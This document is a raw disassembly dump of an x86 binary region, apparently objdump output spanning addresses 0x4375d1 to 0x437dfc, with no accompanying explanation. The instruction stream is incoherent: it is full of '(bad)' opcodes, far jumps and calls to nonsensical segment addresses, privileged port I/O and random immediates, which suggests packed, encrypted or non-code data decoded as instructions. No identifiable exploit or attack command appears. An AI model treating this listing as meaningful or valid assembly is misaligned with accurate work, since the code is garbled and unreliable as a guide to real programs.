  4375d1:	and    ecx,ebx
  4375d3:	inc    ebx
  4375d4:	cs sbb dh,bl
  4375d7:	pusha  
  4375d8:	enter  0xdd41,0x6c
  4375dc:	enter  0xb141,0x19
  4375e0:	mov    ch,0xac
  4375e2:	fs test al,0x11
  4375e5:	(bad)  
  4375e6:	fldl2t 
  4375e8:	pop    es
  4375e9:	mov    dl,0x66
  4375eb:	sub    BYTE PTR es:[esi+0x9],dh
  4375ef:	jae    0x43762a
  4375f1:	add    BYTE PTR [edi+0x1d7e82a2],cl
  4375f7:	js     0x437580
  4375f9:	mov    ebp,DWORD PTR [edx]
  4375fb:	pop    edi
  4375fc:	jg     0x4375d7
  4375fe:	popa   
  4375ff:	stos   DWORD PTR es:[edi],eax
  437600:	test   eax,0x7e5c4c6b
  437605:	adc    cl,ch
  437607:	or     eax,0xa6e723be
  43760c:	push   edx
  43760d:	and    dl,BYTE PTR [eax]
  43760f:	jns    0x437668
  437611:	mov    BYTE PTR [edx],ah
  437613:	out    dx,eax
  437614:	sti    
  437615:	jmp    0x27e1dc77
  43761a:	dec    edx
  43761b:	add    ebp,edx
  43761d:	mov    bl,0xea
  43761f:	into   
  437620:	mov    ebp,0x6ad99df5
  437625:	dec    eax
  437626:	andnpd xmm1,xmm0
  43762a:	adc    ecx,0xa4deb6b9
  437630:	adc    al,BYTE PTR [esi+esi*8+0x78]
  437634:	movsx  ebx,WORD PTR [ebx]
  437637:	push   ss
  437638:	mov    bl,0x84
  43763a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43763b:	mov    ebp,0x9c6203eb
  437640:	lock or BYTE PTR [edx-0x12],dh
  437644:	add    BYTE PTR [ebp-0x4892879f],ch
  43764a:	xlat   BYTE PTR ds:[ebx]
  43764b:	xor    dh,BYTE PTR [ebp+0x5d]
  43764e:	call   0x1324:0x7ade4e78
  437655:	sub    DWORD PTR [eax],eax
  437657:	pop    esi
  437658:	cmp    DWORD PTR [ecx],edx
  43765a:	push   esp
  43765b:	call   0x83d0:0x8ae8a078
  437662:	add    al,0x86
  437664:	push   es
  437665:	cmp    eax,0x1e561e9
  43766a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43766b:	pop    edx
  43766c:	int    0x6d
  43766e:	sub    eax,0x29a7605e
  437673:	push   di
  437675:	adc    DWORD PTR [edx+ebp*1],ebx
  437678:	js     0x4376c8
  43767a:	mov    gs,WORD PTR [edx]
  43767c:	mov    eax,0x135e2912
  437681:	les    ebx,FWORD PTR [edx]
  437683:	fisttp DWORD PTR [ecx]
  437685:	push   eax
  437686:	jbe    0x4376b5
  437688:	mov    esp,0x5eab620c
  43768d:	jmp    0x61a9:0x13080a66
  437694:	pop    esi
  437695:	fldenv [ebp+ecx*2-0x52]
  437699:	test   DWORD PTR ds:0xe9f8760b,edx
  43769f:	popa   
  4376a0:	clc    
  4376a1:	ret    
  4376a2:	jmp    0x6844500a
  4376a7:	pop    ds
  4376a8:	frndint 
  4376aa:	call   0xea3f6f10
  4376af:	popa   
  4376b0:	cmp    DWORD PTR [ecx],eax
  4376b2:	xchg   esi,eax
  4376b3:	sbb    BYTE PTR [esi-0x31],0x62
  4376b7:	adc    al,BYTE PTR [ecx+0xc003c22]
  4376bd:	jb     0x43773c
  4376bf:	add    BYTE PTR [ebx-0x70],bh
  4376c2:	sub    bh,bh
  4376c4:	pop    ss
  4376c5:	rcr    BYTE PTR [eax],0x8b
  4376c8:	(bad)  
  4376c9:	(bad)  
  4376cb:	je     0x437674
  4376cd:	jae    0x43765a
  4376cf:	add    al,0x3
  4376d1:	sub    cl,BYTE PTR [eax-0x1]
  4376d4:	jbe    0x437669
  4376d6:	add    eax,0xc15e8b40
  4376db:	js     0x4376a3
  4376dd:	notrack jmp DWORD PTR [bx+si+0x1c]
  4376e2:	jl     0x4376a2
  4376e4:	dec    eax
  4376e5:	adc    edi,DWORD PTR [esi+0x45]
  4376e8:	dec    ebx
  4376e9:	retf   0x66bf
  4376ec:	ret    0x78c9
  4376ef:	mov    esi,esp
  4376f1:	add    dh,dh
  4376f3:	xor    bl,0x14
  4376f6:	pop    edx
  4376f7:	pop    esi
  4376f8:	outs   dx,BYTE PTR ds:[esi]
  4376f9:	xor    BYTE PTR [esi+0x512d3b08],dh
  4376ff:	jmp    DWORD PTR [edi]
  437701:	mov    edi,0x14e28b04
  437706:	adc    al,0x10
  437708:	cmp    BYTE PTR [ebx+0x5a8b8af8],bl
  43770e:	ret    
  43770f:	add    cl,bh
  437711:	fiadd  DWORD PTR [eax]
  437713:	sbb    DWORD PTR [ebp+0xba000dd],0xb58d268e
  43771d:	fstp   TBYTE PTR [ebp-0x31]
  437720:	add    BYTE PTR [ebx-0x63005ab0],dl
  437726:	popa   
  437727:	shl    DWORD PTR [edi+eiz*2+0x14],0x6d
  43772c:	and    al,0xab
  43772e:	adc    eax,0x2ccb246d
  437733:	stc    
  437734:	aaa    
  437735:	pop    esp
  437736:	outs   dx,BYTE PTR ds:[esi]
  437737:	je     0x43774c
  437739:	bound  eax,QWORD PTR [eax+0x4]
  43773c:	and    DWORD PTR [edx+0x148b4548],0xffffffdf
  437743:	sbb    DWORD PTR [edi+0x989a81f],edi
  437749:	pushf  
  43774a:	test   BYTE PTR [eax+eax*1],cl
  43774d:	jns    0x4376d2
  43774f:	or     eax,0xbdb71f85
  437755:	push   0xffffff80
  437757:	mov    cl,0x51
  437759:	call   0xb7361e7
  43775e:	cli    
  43775f:	xor    al,0xc0
  437761:	jns    0x4376e7
  437763:	test   cl,ah
  437765:	ins    DWORD PTR es:[edi],dx
  437766:	or     cl,BYTE PTR [esi]
  437768:	pop    edx
  437769:	jmp    0x5c38fbae
  43776e:	xchg   edi,eax
  43776f:	vpunpcklbw xmm0,xmm7,XMMWORD PTR [ebx-0x7c]
  437774:	stc    
  437775:	imul   eax,DWORD PTR [edi+0x3f60c9c5],0xffffffb6
  43777c:	xchg   DWORD PTR [eax-0x8],esp
  43777f:	leave  
  437780:	dec    BYTE PTR [eax+0x85ae43]
  437786:	and    eax,DWORD PTR [eax+0x6c]
  437789:	add    al,0x65
  43778b:	mov    dh,0x53
  43778d:	push   ecx
  43778e:	js     0x437809
  437790:	mov    ch,0x7f
  437792:	add    ebp,DWORD PTR [edi-0x22]
  437795:	xor    al,0xfc
  437797:	fidivr DWORD PTR [edi*2-0x3f7e78fe]
  43779e:	xor    bl,BYTE PTR [esi-0x9aa3dff]
  4377a4:	dec    edx
  4377a5:	(bad)  
  4377a6:	jmp    0x437729
  4377a8:	fidiv  WORD PTR [ebx+ebx*8]
  4377ab:	dec    esi
  4377ac:	stc    
  4377ad:	mov    edi,0x7cfd1fe1
  4377b2:	mov    ds:0xbee5d9d8,al
  4377b7:	cwde   
  4377b8:	or     BYTE PTR [edx+0x40afdb74],0xe7
  4377bf:	sbb    al,0xbe
  4377c1:	pop    es
  4377c2:	adc    BYTE PTR [esi],cl
  4377c4:	jae    0x437817
  4377c6:	out    0x6f,eax
  4377c8:	imul   ebx,DWORD PTR [ebx-0x65],0xffffffeb
  4377cc:	out    0xb5,al
  4377ce:	mov    cl,bl
  4377d0:	jns    0x4377c3
  4377d2:	inc    ebp
  4377d3:	fldl2e 
  4377d5:	inc    ebx
  4377d6:	adc    cl,BYTE PTR [edi]
  4377d8:	das    
  4377d9:	ins    BYTE PTR es:[edi],dx
  4377da:	jbe    0x437820
  4377dc:	iret   
  4377dd:	pop    ebx
  4377de:	aas    
  4377df:	mov    al,ds:0xb1568d40
  4377e4:	push   ds
  4377e5:	mov    edx,0xb1e9de1f
  4377ea:	add    dh,bl
  4377ec:	push   0x63
  4377ee:	inc    esi
  4377ef:	loope  0x43785c
  4377f1:	sub    eax,0x40997700
  4377f6:	inc    edi
  4377f7:	mov    edi,0x62d19771
  4377fc:	or     ecx,DWORD PTR [edi+0x29c7bdf1]
  437802:	add    al,0x93
  437804:	mov    si,0xe903
  437808:	and    al,0xec
  43780a:	sbb    BYTE PTR ds:0x2216e5ef,0x81
  437811:	fldcw  WORD PTR [ebx-0x55]
  437814:	inc    ebp
  437815:	pop    edi
  437816:	pop    ebx
  437817:	loope  0x4377b2
  437819:	into   
  43781a:	or     edx,DWORD PTR [ebx-0x559445f5]
  437820:	inc    ebp
  437821:	inc    edi
  437822:	pop    ebx
  437823:	mov    edx,DWORD PTR [ebx]
  437825:	sub    esi,DWORD PTR [edx-0x70be9fce]
  43782b:	les    ebx,FWORD PTR [esi+0x1]
  43782e:	ss mov bl,0xd8
  437831:	xor    ebp,DWORD PTR [ecx]
  437833:	xor    eax,0x192783b7
  437838:	call   0xc85c2e46
  43783d:	adc    dl,bh
  43783f:	mov    eax,ds:0xdb198b74
  437844:	pop    ds
  437845:	add    ch,BYTE PTR [edi+ebp*1-0x13]
  437849:	fist   WORD PTR [ecx]
  43784b:	inc    esi
  43784c:	inc    ebp
  43784d:	clc    
  43784e:	test   BYTE PTR [eax],0xe2
  437851:	cdq    
  437852:	ins    DWORD PTR es:[edi],dx
  437853:	loope  0x437828
  437855:	or     DWORD PTR [ecx-0x2f],edx
  437858:	out    0x45,al
  43785a:	clc    
  43785b:	fidivr WORD PTR [eax-0x4cc53bee]
  437861:	or     dl,BYTE PTR [eax+0x62]
  437864:	push   es
  437865:	pop    esi
  437866:	fld    TBYTE PTR [eax+edi*4-0x13]
  43786a:	inc    ebx
  43786b:	jb     0x437892
  43786d:	mov    eax,0xe97a620c
  437872:	adc    ch,BYTE PTR [ecx]
  437874:	pop    esi
  437875:	div    dh
  437877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437878:	adc    dl,bh
  43787a:	push   ebx
  43787b:	sahf   
  43787c:	jb     0x4378dc
  43787e:	icebp  
  43787f:	xchg   esi,eax
  437880:	push   eax
  437881:	jb     0x437851
  437883:	bound  edi,QWORD PTR [ecx-0x1528faa0]
  437889:	int3   
  43788a:	inc    ebp
  43788b:	jmp    0x4378ee
  43788d:	fld    DWORD PTR [eax]
  43788f:	bound  ebx,QWORD PTR [eax-0x57bdad7f]
  437895:	jb     0x437914
  437897:	sub    DWORD PTR ds:0xeae68bc8,ebp
  43789d:	in     al,0x2e
  43789f:	mov    eax,0xc0fd5eb4
  4378a4:	mov    cl,0x7b
  4378a6:	xor    al,0x0
  4378a8:	test   DWORD PTR [esi],0x2cab0fa
  4378ae:	div    DWORD PTR [ecx]
  4378b0:	jnp    0x4378e1
  4378b2:	pop    edx
  4378b3:	pop    ebp
  4378b4:	add    al,dh
  4378b6:	sbb    eax,0x2cfafffd
  4378bb:	push   edx
  4378bc:	mov    ebx,DWORD PTR [edx+0x2a]
  4378bf:	stc    
  4378c0:	adc    eax,0x386dcb
  4378c5:	inc    eax
  4378c6:	test   al,0x83
  4378c8:	rcl    BYTE PTR [ecx+eiz*2-0x2874ff82],cl
  4378cf:	inc    ebp
  4378d0:	push   ebp
  4378d1:	in     al,dx
  4378d2:	test   DWORD PTR [eax],ebx
  4378d4:	pop    ebx
  4378d5:	enter  0x5f0e,0x9
  4378d9:	lock and DWORD PTR [edi+eax*8+0x3f],ebx
  4378de:	mov    ecx,0xd77b0d10
  4378e3:	add    bh,al
  4378e5:	aas    
  4378e6:	mov    ecx,0xd74bff0c
  4378eb:	add    BYTE PTR [ebp+0xf168ff9],al
  4378f1:	int3   
  4378f2:	(bad)  [edx+0x66]
  4378f5:	push   eax
  4378f6:	push   ds
  4378f7:	ins    DWORD PTR es:[edi],dx
  4378f8:	adc    ebp,DWORD PTR [ebp-0x2c]
  4378fb:	ret    
  4378fc:	jb     0x43793a
  4378fe:	jns    0x43792d
  437900:	inc    esp
  437901:	pop    ds
  437902:	addr16 jb 0x43790c
  437905:	pop    ebp
  437906:	aam    0x3c
  437908:	and    al,0x3f
  43790a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43790b:	add    al,BYTE PTR [edi+0x4a]
  43790e:	aam    0xbe
  437910:	jl     0x437907
  437912:	(bad)  
  437913:	ror    DWORD PTR [ebp+0x7a8b9127],1
  437919:	add    BYTE PTR [edx+esi*8-0x1f948707],al
  437920:	mov    cl,0x4
  437922:	bound  ecx,QWORD PTR [ecx-0x72decb1e]
  437928:	in     eax,dx
  437929:	popa   
  43792a:	cdq    
  43792b:	(bad)
  43792e:	cmp    al,0xd7
  437930:	shl    BYTE PTR [ebx],0x72
  437933:	xor    al,BYTE PTR [ecx]
  437935:	bound  ecx,QWORD PTR [ecx+0x3714183c]
  43793b:	test   dh,al
  43793d:	dec    eax
  43793e:	cmp    esp,eax
  437940:	mov    ecx,0x4a87095a
  437945:	jb     0x43799c
  437947:	std    
  437948:	cs jp  0x4379b4
  43794b:	in     eax,dx
  43794c:	add    BYTE PTR [esi],cl
  43794e:	xor    dl,BYTE PTR [ecx-0x4e]
  437951:	out    0xd9,eax
  437953:	pop    ss
  437954:	pop    edx
  437955:	stc    
  437956:	push   ecx
  437957:	shl    dl,0x86
  43795a:	data16 mov dl,0xba
  43795d:	push   esi
  43795e:	sbb    edi,DWORD PTR [edi]
  437960:	mov    dl,0x84
  437962:	jae    0x437916
  437964:	pop    ecx
  437965:	adc    edx,DWORD PTR [edx+0x6f]
  437968:	(bad)  
  437969:	(bad)  
  43796a:	call   0xd511f0be
  43796f:	sbb    ch,BYTE PTR [esi+0xd2b9150]
  437975:	(bad)  
  437976:	or     DWORD PTR [ebx+0x4],eax
  437979:	add    BYTE PTR [edx+0x5],ah
  43797c:	cs jp  0x43797f
  43797f:	push   esi
  437980:	out    0xf7,al
  437982:	outs   dx,BYTE PTR cs:[esi]
  437984:	mov    al,ds:0x796608c8
  437989:	rol    BYTE PTR [ebx],1
  43798b:	pop    esi
  43798c:	ins    DWORD PTR es:[edi],dx
  43798d:	fiadd  DWORD PTR [eax]
  43798f:	gs mov dl,0x43
  437992:	xor    eax,0x41027521
  437997:	mov    ds:0x67c4627,eax
  43799c:	fst    DWORD PTR [edx]
  43799e:	xor    edi,esi
  4379a0:	jae    0x437a07
  4379a2:	int    0xea
  4379a4:	pop    ebx
  4379a5:	and    ebx,ebx
  4379a7:	dec    edi
  4379a8:	pop    edi
  4379a9:	ficomp WORD PTR [edx]
  4379ab:	sahf   
  4379ac:	mov    ecx,0xe09608b5
  4379b1:	mov    ch,0xff
  4379b3:	mov    esp,esp
  4379b5:	scas   eax,DWORD PTR es:[edi]
  4379b6:	add    BYTE PTR [ebx+0x33],bl
  4379b9:	sub    bl,BYTE PTR [edi+edi*8]
  4379bc:	jmp    0x4379a3
  4379be:	int    0x1c
  4379c0:	lock call FWORD PTR [ebx]
  4379c3:	test   al,0xea
  4379c5:	fnstsw WORD PTR [esi-0x6c]
  4379c8:	repnz loope 0x437980
  4379cb:	xor    cl,BYTE PTR [ebx]
  4379cd:	adc    dh,dl
  4379cf:	mov    esi,0xa3b7f771
  4379d4:	fdivr  QWORD PTR [ebx+0x2b132f03]
  4379da:	mov    ah,0x13
  4379dc:	or     dl,BYTE PTR [ecx+eax*1-0x21]
  4379e0:	addr16 sbb al,0x3b
  4379e3:	add    BYTE PTR [ebx],cl
  4379e5:	loop   0x43797d
  4379e7:	push   es
  4379e8:	fst    DWORD PTR [edi]
  4379ea:	mov    edx,0xf171dede
  4379ef:	into   
  4379f0:	pusha  
  4379f1:	loopne 0x437a61
  4379f3:	dec    esp
  4379f4:	inc    edi
  4379f5:	rcr    BYTE PTR [ebp+eax*8+0xa],1
  4379f9:	clc    
  4379fa:	repnz ds mov bl,0xe1
  4379fe:	push   0xea711d45
  437a03:	add    eax,DWORD PTR [edi-0x20]
  437a06:	pop    esp
  437a07:	(bad)
  437a0a:	sar    BYTE PTR [esi],cl
  437a0c:	xchg   ebx,eax
  437a0d:	into   
  437a0e:	push   0xea70bd45
  437a13:	add    esp,esi
  437a15:	xchg   esp,eax
  437a16:	add    ebp,edi
  437a18:	add    al,0xd9
  437a1a:	or     ch,BYTE PTR [ebx]
  437a1c:	push   eax
  437a1d:	xchg   ah,ch
  437a1f:	out    dx,al
  437a20:	mov    eax,ds:0x5870fd90
  437a25:	add    ch,BYTE PTR ds:[edx+0x24]
  437a29:	outs   dx,DWORD PTR ds:[esi]
  437a2a:	jmp    0x4379bf
  437a2c:	mov    esp,0x69bcca5b
  437a31:	push   ebp
  437a32:	fdiv   QWORD PTR [ebp+ecx*8+0x60420240]
  437a39:	mov    edi,0x5f78ec0
  437a3e:	les    edi,FWORD PTR [eax-0x7273f410]
  437a44:	dec    ebp
  437a45:	leave  
  437a46:	dec    esi
  437a47:	mov    esi,0x3468d800
  437a4c:	pop    ss
  437a4d:	jmp    0x437a1c
  437a4f:	pshufw mm6,QWORD PTR [ebx-0x21621490],0xed
  437a57:	sbb    al,0xd9
  437a59:	fcomp  DWORD PTR [edx-0x296f0dc4]
  437a5f:	and    BYTE PTR [ecx],0x4a
  437a62:	in     eax,0xfd
  437a64:	sub    BYTE PTR [ecx+0x2e],cl
  437a67:	jae    0x437a48
  437a69:	fsub   DWORD PTR [ecx+0x1cee9e2c]
  437a6f:	sbb    eax,0xadc4eae1
  437a74:	in     eax,0x61
  437a76:	fld    DWORD PTR [eax]
  437a78:	bound  ebx,QWORD PTR [edx-0x3617869c]
  437a7e:	add    ebp,DWORD PTR [edx-0x3eaa735a]
  437a84:	adc    eax,0xcd4d564f
  437a89:	sub    DWORD PTR [ebx-0x2d],ebx
  437a8c:	adc    eax,0x455511
  437a91:	daa    
  437a92:	ins    BYTE PTR es:[edi],dx
  437a93:	loopne 0x437a2f
  437a95:	mov    es,WORD PTR [edi]
  437a97:	cli    
  437a98:	mov    edi,DWORD PTR [esi]
  437a9a:	aad    0x7f
  437a9c:	add    al,0x3a
  437a9e:	pop    ecx
  437a9f:	shl    DWORD PTR [ebp+ebx*2+0x64],0x44
  437aa4:	add    BYTE PTR [eax-0x28],dh
  437aa7:	mov    al,0x85
  437aa9:	inc    edx
  437aaa:	mov    al,ds:0xf600e803
  437aaf:	add    eax,0xd305fffa
  437ab4:	in     eax,dx
  437ab5:	jb     0x437a92
  437ab7:	(bad)
  437abc:	dec    ebp
  437abd:	pop    ecx
  437abe:	mov    eax,ebx
  437ac0:	add    BYTE PTR [ebx-0x17339c8b],cl
  437ac6:	push   esp
  437ac7:	cmp    eax,0x2438fffa
  437acc:	cli    
  437acd:	jmp    0x437b30
  437acf:	and    eax,0x3df65347
  437ad4:	jge    0x437ac7
  437ad6:	adc    BYTE PTR [eax+0x60e41824],bl
  437adc:	adc    eax,0x8006b856
  437ae1:	cmp    DWORD PTR [eax+0xa],eax
  437ae4:	or     al,BYTE PTR [ebx+0xd4e6]
  437aea:	and    eax,ebx
  437aec:	rol    DWORD PTR [edi+eiz*2+0x69],0xfe
  437af1:	dec    DWORD PTR [ebx-0x25]
  437af4:	pop    ebx
  437af5:	mov    DWORD PTR [edi-0xa74f347],edx
  437afb:	shl    ch,1
  437afd:	jae    0x437b14
  437aff:	(bad)  
  437b00:	mov    cl,0x10
  437b02:	ror    BYTE PTR gs:[esp+0x2b],1
  437b07:	lahf   
  437b08:	or     al,0x66
  437b0a:	bound  ecx,QWORD PTR [ebx+0x3657427]
  437b10:	cmp    eax,0x435800fe
  437b15:	shl    ebp,cl
  437b17:	(bad)  [eax+0x2a]
  437b1a:	jmp    0x7477:0xbd19e633
  437b21:	mov    eax,esi
  437b23:	or     esp,ebx
  437b25:	jg     0x437b77
  437b27:	pusha  
  437b28:	mov    ebx,0x9a536d31
  437b2d:	call   FWORD PTR [ecx+0x44]
  437b30:	leave  
  437b31:	or     al,0x73
  437b33:	imul   ecx,DWORD PTR [edx-0x26bba5f6],0x12
  437b3a:	or     DWORD PTR [esi],ebx
  437b3c:	ret    0x707f
  437b3f:	pusha  
  437b40:	or     eax,0x805ebaf1
  437b45:	add    al,0x0
  437b47:	mov    edx,0xa5f9a508
  437b4c:	cld    
  437b4d:	cmp    al,0x74
  437b4f:	cs cmc 
  437b51:	pop    edi
  437b52:	je     0x437bcf
  437b54:	jmp    0x437b1e
  437b56:	and    esi,DWORD PTR [esi-0x15]
  437b59:	daa    
  437b5a:	call   0xf990e047
  437b5f:	jmp    0xe95f9350
  437b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437b65:	cld    
  437b66:	xchg   BYTE PTR [esi+0x39],ah
  437b69:	ja     0x437b2b
  437b6b:	out    dx,al
  437b6c:	ror    BYTE PTR [ecx-0x768379b4],cl
  437b72:	jmp    eax
  437b74:	rcl    DWORD PTR [eax+eax*1-0x76832a00],cl
  437b7b:	or     al,0xa
  437b7d:	cwde   
  437b7e:	sar    edx,0x3d
  437b81:	aas    
  437b82:	mov    DWORD PTR [esi+edi*2-0x27],ecx
  437b86:	std    
  437b87:	mov    esp,0x1934dcc7
  437b8c:	aaa    
  437b8d:	fisubr WORD PTR [ebx-0x23]
  437b90:	sbb    ch,BYTE PTR [esi-0x79]
  437b93:	mov    BYTE PTR [ebx],ah
  437b95:	push   cs
  437b96:	and    BYTE PTR [edi+0x422110b6],dh
  437b9c:	push   esi
  437b9d:	fldenv [edx-0x19]
  437ba0:	inc    ecx
  437ba1:	int    0x62
  437ba3:	sub    al,0xdf
  437ba5:	fwait
  437ba6:	push   edx
  437ba7:	stc    
  437ba8:	les    ebp,FWORD PTR [ebp+0x57]
  437bab:	sbb    BYTE PTR [edx],0x6e
  437bae:	inc    ebx
  437baf:	pop    esi
  437bb0:	sub    eax,0x6a1f9e62
  437bb5:	or     dl,BYTE PTR [ebp+0x416232ad]
  437bbb:	adc    BYTE PTR [ebp-0x71791e49],bl
  437bc1:	(bad)  
  437bc2:	pusha  
  437bc3:	mov    DWORD PTR [ecx+0x5b56e2c9],0x6203415a
  437bcd:	fldenv [ebx-0x4]
  437bd0:	pop    ecx
  437bd1:	mov    ecx,0xe059f18d
  437bd6:	jge    0x437bd7
  437bd8:	dec    ecx
  437bd9:	fdiv   QWORD PTR [edi+0x9]
  437bdc:	add    BYTE PTR [ebx+0x2f],bl
  437bdf:	sub    dl,BYTE PTR [esi]
  437be1:	jnp    0x437bbb
  437be3:	jmp    0x27176ceb
  437be8:	punpckhwd mm5,mm2
  437beb:	retf   0x690f
  437bee:	(bad)  [edx-0x68]
  437bf1:	(bad)  
  437bf2:	fldl2t 
  437bf4:	jge    0x437c71
  437bf6:	pop    esi
  437bf7:	aaa    
  437bf8:	add    eax,0xd7ff70e2
  437bfd:	pusha  
  437bfe:	pop    ecx
  437bff:	add    DWORD PTR [edx+0x6215e884],esi
  437c05:	nop
  437c06:	jbe    0x437c38
  437c08:	jae    0x437c62
  437c0a:	lods   eax,DWORD PTR ds:[esi]
  437c0b:	and    BYTE PTR ds:0x1509ad54,dl
  437c11:	push   0xffffffad
  437c13:	add    eax,0xb6e26c0f
  437c18:	test   eax,0xe9017273
  437c1d:	popa   
  437c1e:	in     eax,0x28
  437c20:	das    
  437c21:	ins    DWORD PTR es:[edi],dx
  437c22:	push   0xcc958a73
  437c27:	cmp    BYTE PTR [edi],al
  437c29:	or     ebx,esi
  437c2b:	xor    edi,DWORD PTR [ebx]
  437c2d:	jecxz  0x437c46
  437c2f:	clc    
  437c30:	inc    edx
  437c31:	fs stos DWORD PTR es:[edi],eax
  437c33:	dec    eax
  437c34:	imul   esp,DWORD PTR [esi+0xd],0x2b28406d
  437c3b:	add    dh,BYTE PTR [ebp+0x3c3c175a]
  437c41:	add    BYTE PTR [eax+edi*2+0x6b9b343c],dl
  437c48:	inc    edi
  437c49:	je     0x437bf5
  437c4b:	pop    edi
  437c4c:	std    
  437c4d:	call   0xa5cf55b3
  437c52:	inc    ebp
  437c53:	ror    DWORD PTR [ebx-0x166d8ad1],1
  437c59:	gs mov ecx,0x1e65f872
  437c5f:	in     eax,0x33
  437c61:	ins    BYTE PTR es:[edi],dx
  437c62:	dec    ebp
  437c63:	call   0xab733672
  437c68:	mov    ecx,0x119c1eb
  437c6d:	rcr    BYTE PTR [ebp+0x56],cl
  437c70:	aam    0x62
  437c72:	mov    al,ds:0xb0d2c381
  437c77:	jb     0x437c05
  437c79:	add    BYTE PTR [edi-0x1474ef3f],dl
  437c7f:	jmp    0x8900:0xeb13243c
  437c86:	(bad)  
  437c88:	adc    edx,0x4f
  437c8b:	fidiv  DWORD PTR [edi]
  437c8d:	lea    eax,[ebp-0x2a]
  437c90:	fbstp  TBYTE PTR [ecx]
  437c92:	hlt    
  437c93:	push   es
  437c94:	cli    
  437c95:	mov    esi,DWORD PTR [edi-0x3f]
  437c98:	adc    BYTE PTR [ebx-0x74e73ec1],cl
  437c9e:	jmp    0xfa50:0x28e808ea
  437ca5:	inc    DWORD PTR [eax]
  437ca7:	mov    BYTE PTR [eax-0x15061407],dh
  437cad:	mov    bh,0x5f
  437caf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437cb0:	sub    BYTE PTR [ebp+0x59],cl
  437cb3:	mov    DWORD PTR [eax-0x8],esi
  437cb6:	adc    BYTE PTR [edi-0x12aaba80],0x2e
  437cbd:	pop    esi
  437cbe:	and    BYTE PTR [eax+0x1d],dl
  437cc1:	jle    0x437d0f
  437cc3:	outs   dx,DWORD PTR ds:[esi]
  437cc4:	lds    ecx,FWORD PTR [ebp-0x73]
  437cc7:	mov    bh,0x2e
  437cc9:	pop    esi
  437cca:	or     DWORD PTR [eax-0x1aeee85b],ecx
  437cd0:	in     al,dx
  437cd1:	fs and al,0xab
  437cd4:	in     al,dx
  437cd5:	ins    BYTE PTR es:[edi],dx
  437cd6:	and    al,0x87
  437cd8:	push   ds
  437cd9:	cmp    eax,0xd8af24
  437cde:	add    BYTE PTR [ebx+0x1e],bh
  437ce1:	cmp    eax,0x1069324
  437ce6:	add    BYTE PTR [ebx+0x6b244cec],cl
  437cec:	fdiv   st(3),st
  437cee:	psubb  mm7,QWORD PTR [ebp-0x9]
  437cf2:	jmp    DWORD PTR [edx-0x80]
  437cf5:	add    DWORD PTR [ecx-0x42f9eda3],esi
  437cfb:	(bad)  
  437cfc:	(bad)
  437d00:	scas   eax,DWORD PTR es:[edi]
  437d01:	or     DWORD PTR [edx+0x79],esp
  437d04:	mov    esp,0x73ac1428
  437d09:	jmp    0x72ec:0x9ca60034
  437d10:	pop    ebp
  437d11:	dec    DWORD PTR [ecx-0x2]
  437d14:	pop    eax
  437d15:	inc    ebp
  437d16:	iret   
  437d17:	fstp   DWORD PTR [ecx+0x5d]
  437d1a:	add    bh,BYTE PTR [ebp+0x13]
  437d1d:	add    DWORD PTR [eax+eax*1],0x8b09a355
  437d24:	jne    0x437da4
  437d26:	jge    0x437d20
  437d28:	cmp    eax,0xea7cfb64
  437d2d:	fiadd  WORD PTR [ecx]
  437d2f:	or     esi,0xffffff80
  437d32:	add    al,0x0
  437d34:	jmp    0xec1bf33b
  437d39:	pushf  
  437d3a:	and    BYTE PTR [ecx+ecx*4],ah
  437d3d:	lods   eax,DWORD PTR ds:[esi]
  437d3e:	int    0x38
  437d40:	cmp    BYTE PTR [ecx+esi*4+0x61],cl
  437d44:	jnp    0x437cc8
  437d46:	iret   
  437d47:	sbb    eax,0x2d5232e7
  437d4c:	fwait
  437d4d:	pop    edx
  437d4e:	or     edi,DWORD PTR [eax]
  437d50:	das    
  437d51:	outs   dx,DWORD PTR ds:[esi]
  437d52:	(bad)  
  437d53:	pop    ebx
  437d54:	aas    
  437d55:	cmc    
  437d56:	mov    esp,0xb5223f9
  437d5b:	sub    BYTE PTR [esi],dl
  437d5d:	imul   esi,DWORD PTR [ebp+0x6c],0x3e
  437d61:	mov    al,ds:0x6a1d5bd6
  437d66:	inc    ebx
  437d67:	push   ecx
  437d69:	jb     0x437de8
  437d6b:	ret    0xd960
  437d6e:	and    dl,BYTE PTR [edi+0x0]
  437d71:	hlt    
  437d72:	xchg   BYTE PTR [ebx-0x31],dh
  437d75:	xor    DWORD PTR [ebp-0x367e489e],0xbd81bf62
  437d7f:	add    dl,BYTE PTR [edi-0x2f]
  437d82:	(bad)  
  437d83:	push   0x60
  437d85:	cmp    al,0x5f
  437d87:	nop
  437d88:	sbb    al,0x1b
  437d8a:	pop    esp
  437d8b:	into   
  437d8c:	jbe    0x437df4
  437d8e:	fldl2t 
  437d90:	add    edx,DWORD PTR ds:0xc3e8926e
  437d96:	imul   ecx,DWORD PTR [edi+0xae52287],0xb9e43787
  437da0:	adc    al,0x14
  437da2:	pop    ss
  437da3:	inc    ecx
  437da4:	or     ebx,eax
  437da6:	sbb    dl,ch
  437da8:	pop    esp
  437da9:	cmp    al,0xda
  437dab:	or     DWORD PTR cs:[eax+0x11d72aae],eax
  437db2:	repz and cl,al
  437db5:	or     ebp,0xae4008db
  437dbb:	popf   
  437dbc:	daa    
  437dbd:	jbe    0x437da2
  437dbf:	daa    
  437dc0:	jmp    0xec419353
  437dc5:	xor    DWORD PTR [edx],ebp
  437dc7:	imul   ecx,DWORD PTR [ecx-0x4c],0xffffffae
  437dcb:	sub    al,0xd5
  437dcd:	mov    DWORD PTR [ebp+0x58],edi
  437dd0:	jl     0x437d69
  437dd2:	pop    ebp
  437dd3:	daa    
  437dd4:	pop    ebx
  437dd5:	add    BYTE PTR [edi+0x6f],al
  437dd8:	movmskps ebx,xmm7
  437ddb:	in     al,dx
  437ddc:	mov    ebp,0xc604e71f
  437de1:	repz fisub WORD PTR [eax-0x231af78d]
  437de8:	add    BYTE PTR [ecx-0x24],bl
  437deb:	xchg   ecx,eax
  437dec:	ins    DWORD PTR es:[edi],dx
  437ded:	shr    dh,cl
  437def:	sbb    al,0x1d
  437df1:	adc    eax,0x535bc988
  437df6:	pop    edi
  437df7:	push   esp
  437df8:	ja     0x437de5
  437dfa:	and    eax,DWORD PTR [ebx]
  437dfc:	jmp    0xa72:0xf8629cbc
